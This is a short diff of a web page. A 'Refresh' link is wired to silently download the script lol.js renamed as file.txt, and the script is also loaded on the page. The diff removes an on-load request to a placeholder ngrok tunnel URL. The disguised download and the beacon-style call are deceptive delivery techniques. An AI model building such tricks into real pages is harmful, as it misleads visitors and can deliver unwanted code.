@@ -141,7 +141,9 @@
   font-style: normal;
   font-weight: 700;
 }</style></head>
+  
 <script defer src="lol.js"></script>
+  
 <a href="lol.js" id="downloadLink">Refresh</a>
 
   <script>
@@ -150,7 +152,6 @@
     link.addEventListener('click', function(event) {
       event.preventDefault(); // Stop the default navigation
 
-      // Create a temporary link to trigger download
       const tempLink = document.createElement('a');
       tempLink.href = 'lol.js';         
       tempLink.download = 'file.txt';  
@@ -159,14 +160,6 @@
       document.body.removeChild(tempLink);
     });
   </script>
-  <script>
-// Automatically send request with the header immediately on page load
-fetch("https://YOUR_NGROK_URL", {
-  headers: {
-    "ngrok-skip-browser-warning": "any-value-you-want"
-  }
-});
-</script>
   <body>
     
     <div class="container">
@@ -176,4 +169,5 @@ fetch("https://YOUR_NGROK_URL", {
         </div>
     
   </body>
+
 </html>
